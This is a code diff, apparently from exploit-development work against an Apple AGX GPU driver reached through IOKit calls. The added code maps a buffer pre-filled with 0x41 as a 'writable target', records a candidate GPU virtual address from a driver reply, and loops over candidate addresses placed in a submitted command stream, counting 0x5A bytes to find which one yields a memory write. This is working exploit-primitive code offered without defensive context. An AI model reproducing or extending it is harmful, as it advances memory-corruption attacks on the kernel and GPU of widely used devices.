@@ -2300,6 +2300,7 @@ static void p_qdrive(void) {
 // V50: end-to-end submit — queue + 2 resources + command stream in resource B.
 // Command stream: commands >= 0x10, header u32 @+0xc (bit31=end, bits29:0=type).
 static io_connect_t g_gpu;
+static uint64_t g_last_res_off;
 static uint32_t gpu_resource(io_connect_t c, uint8_t *buf, uint64_t size) {
     uint8_t *in = must_map(0x1000);
     uint8_t *out = must_map(0x1000);
@@ -2313,7 +2314,8 @@ static uint32_t gpu_resource(io_connect_t c, uint8_t *buf, uint64_t size) {
     uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
     kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
     uint32_t rid = *(uint32_t *)(out + 0x24);
-    LOG("[sm] resource buf %p sz 0x%llx -> kr 0x%08x rid %u", buf, size, kr, rid);
+    g_last_res_off = *(uint32_t *)(out + 0x00);          // candidate GPUVA offset
+    LOG("[sm] resource buf %p sz 0x%llx -> kr 0x%08x rid %u off32 %x", buf, size, kr, rid, g_last_res_off);
     vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
     vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
     return kr ? 0 : rid;
@@ -7337,6 +7339,12 @@ static void p_agxfaithful(void) {
     uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
     if (!idA || !idB) return;
     uint8_t *entry = must_map(0x1000);
+    // our writable target: sel8 resource (pre-fill 0x41)
+    uint8_t *tgt = must_map(0x10000);
+    memset(tgt, 0x41, 0x10000);
+    uint32_t ridT = gpu_resource(c, tgt, 0x10000);
+    uint64_t tgtGPUVA = 0x100000000ULL | g_last_res_off;   // candidate
+    LOG("[fu] target resource rid %u, candidate GPUVA 0x%llx", ridT, tgtGPUVA);
     uint8_t *aux1 = must_map(0x1000);
     uint8_t *aux2 = must_map(0x1000);
     memset(aux1, 0, 0x1000); memset(aux2, 0, 0x1000);
@@ -9456,6 +9464,12 @@ static void p_agxfull(void) {
     uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
     uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
     if (!idA || !idB) return;
+    // our writable target: sel8 resource (pre-fill 0x41)
+    uint8_t *tgt = must_map(0x10000);
+    memset(tgt, 0x41, 0x10000);
+    uint32_t ridT = gpu_resource(c, tgt, 0x10000);
+    uint64_t tgtGPUVA = 0x100000000ULL | g_last_res_off;   // candidate
+    LOG("[fu] target resource rid %u, candidate GPUVA 0x%llx", ridT, tgtGPUVA);
     uint8_t *entry = must_map(0x1000);
     uint8_t *aux1 = must_map(0x1000);
     uint8_t *aux2 = must_map(0x1000);
@@ -9463,20 +9477,29 @@ static void p_agxfull(void) {
     uint32_t *outw = (uint32_t *)must_map(0x100);
     memcpy(vaA, agx_A3_image, 0x4000);
     memcpy(vaB, agx_B3_image, 0x4000);
-    memset(entry, 0, 0x1000);
-    *(uint32_t *)(entry + 0x00) = idA;
-    *(uint32_t *)(entry + 0x04) = idB;
-    *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
-    *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
-    *outw = 0xdeadbeef;
-    // baseline scan for 0x5A BEFORE submit
-    long pre = scan5a_count(0);
-    kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
-    LOG("[fu] full submit -> kr 0x%08x outw %08x (pre-5A %ld)", kt, *outw, pre);
-    usleep(500000);
-    // post-submit: scan for NEW 0x5A regions
-    scan5a_report(pre);
-    LOG("[v68] done (alive)");
+    // GPUVA sweep at command+0x340: find our resource's GPUVA by write-hit
+    static const uint64_t cands[] = {
+        0x100010000ULL, 0x100020000ULL, 0x100030000ULL, 0x100040000ULL,
+        0x100008000ULL, 0x10000c000ULL, 0x100000000ULL,
+    };
+    for (unsigned ci = 0; ci < sizeof(cands)/8 && ridT; ci++) {
+        memset(tgt, 0x41, 0x10000);
+        memcpy(vaA, agx_A3_image, 0x4000);
+        memcpy(vaB, agx_B3_image, 0x4000);
+        *(uint64_t *)(vaA + 0xac + 0x340) = cands[ci];
+        memset(entry, 0, 0x1000);
+        *(uint32_t *)(entry + 0x00) = idA;
+        *(uint32_t *)(entry + 0x04) = idB;
+        *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
+        *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
+        *outw = 0xdeadbeef;
+        kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        usleep(300000);
+        long c5 = 0;
+        for (int i = 0; i < 0x10000; i++) if (tgt[i] == 0x5A) c5++;
+        LOG("[fu] GPUVA 0x%llx -> kr 0x%08x outw %08x, target 5A %ld", cands[ci], kt, *outw, c5);
+    }
+    LOG("[v69] done (alive)");
 }
 
 // helpers: count regions with >100 0x5A bytes; report regions with growth
